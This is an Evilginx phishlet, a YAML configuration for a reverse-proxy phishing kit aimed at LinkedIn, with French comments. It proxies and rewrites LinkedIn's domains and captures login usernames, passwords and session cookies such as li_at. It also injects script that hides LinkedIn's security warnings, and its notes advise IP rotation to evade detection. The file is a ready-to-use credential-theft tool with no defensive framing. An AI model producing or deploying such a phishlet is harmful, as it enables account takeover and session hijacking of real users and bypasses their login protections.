##########################################################
# PHISHLET LINKEDIN - EVILGINX PRO
# Configuration pour LinkedIn.com
##########################################################

name: "linkedin"
author: "@breakdev"
min_ver: "3.0.0"

##########################################################
# PROXY HOSTS
##########################################################
proxy_hosts:
  # LinkedIn principal
  - phish_sub: "www"
    orig_sub: "www"
    domain: "linkedin.com"
    session: true
    is_landing: true
    auto_filter: true

  # APIs LinkedIn
  - phish_sub: "api"
    orig_sub: "api"
    domain: "linkedin.com"
    session: false
    is_landing: false

  # Ressources statiques
  - phish_sub: "static"
    orig_sub: "static"
    domain: "licdn.com"
    session: false
    is_landing: false

  - phish_sub: "media"
    orig_sub: "media"
    domain: "licdn.com"
    session: false
    is_landing: false

  # CDN
  - phish_sub: "www"
    orig_sub: "www"
    domain: "licdn.com"
    session: false
    is_landing: false

##########################################################
# SUB FILTERS
##########################################################
sub_filters:
  # LinkedIn principal
  - triggers_on: "www.linkedin.com"
    orig_sub: "www"
    domain: "linkedin.com"
    search: "www.linkedin.com"
    replace: "{hostname}"
    mimes: ["text/html", "application/json", "application/javascript"]

  - triggers_on: "www.linkedin.com"
    orig_sub: "www"
    domain: "linkedin.com"
    search: "https://www.linkedin.com"
    replace: "https://{hostname}"
    mimes: ["text/html", "application/json"]

  - triggers_on: "www.linkedin.com"
    orig_sub: "www"
    domain: "linkedin.com"
    search: '"linkedin.com"'
    replace: '"{domain}"'
    mimes: ["application/json"]

  # LinkedIn CDN
  - triggers_on: "www.linkedin.com"
    orig_sub: "static"
    domain: "licdn.com"
    search: "static.licdn.com"
    replace: "{hostname}"
    mimes: ["text/html", "text/css", "application/javascript"]

  - triggers_on: "www.linkedin.com"
    orig_sub: "media"
    domain: "licdn.com"
    search: "media.licdn.com"
    replace: "{hostname}"
    mimes: ["text/html", "text/css"]

##########################################################
# AUTH TOKENS
##########################################################
auth_tokens:
  # Cookies de session LinkedIn
  - domain: ".linkedin.com"
    keys:
      - "li_at" # Primary authentication token
      - "JSESSIONID" # Java session ID
      - "liap" # LinkedIn app token
      - "lang" # Language preference
      - "bcookie" # Browser cookie
      - "bscookie" # Browser secure cookie

  - domain: ".www.linkedin.com"
    keys:
      - "li_at"
      - "JSESSIONID"

##########################################################
# CREDENTIALS
##########################################################
credentials:
  # Email ou username
  username:
    key: "session_key"
    search: "(.*)"
    type: "post"

  # Mot de passe
  password:
    key: "session_password"
    search: "(.*)"
    type: "post"

##########################################################
# LOGIN
##########################################################
login:
  domain: "www.linkedin.com"
  path: "/login"

##########################################################
# FORCE POST
##########################################################
force_post:
  - path: "/checkpoint/lg/login-submit"
    search:
      - { key: "session_key", search: "(.*)" }
      - { key: "session_password", search: "(.*)" }
    force:
      - { key: "session_key", value: "{session_key}" }
      - { key: "session_password", value: "{session_password}" }
      - { key: "loginCsrfParam", value: "" }
    type: "post"

##########################################################
# JS INJECT (Pro)
##########################################################
js_inject:
  - trigger_domains: ["www.linkedin.com"]
    trigger_paths: ["/login", "/checkpoint/lg/login-submit"]
    script: |
      // Contournement détection LinkedIn
      console.log('LinkedIn phishing active');

      // Masquer les messages d'erreur de sécurité
      var alerts = document.querySelectorAll('.alert');
      alerts.forEach(function(el) {
        if (el.textContent.includes('unusual') || el.textContent.includes('verify')) {
          el.style.display = 'none';
        }
      });

##########################################################
# AUTH URLS
##########################################################
auth_urls:
  - "/login"
  - "/uas/login"
  - "/uas/login-submit"
  - "/checkpoint/lg/login-submit"
  - "/checkpoint/challenge/verify"

##########################################################
# LANDING URLS
##########################################################
landing_urls:
  - "/feed"
  - "/mynetwork"
  - "https://www.linkedin.com/feed"
##########################################################
# NOTES
##########################################################
# LinkedIn utilise plusieurs protections :
# - CSRF tokens
# - Device fingerprinting
# - Location-based verification
# - Challenge-response (email/SMS)
#
# Ce phishlet capture :
# - Email/username et password
# - Tokens de session li_at
# - Cookies persistants
#
# ATTENTION : LinkedIn détecte activement le phishing
# Utiliser avec précaution et rotation IP
##########################################################
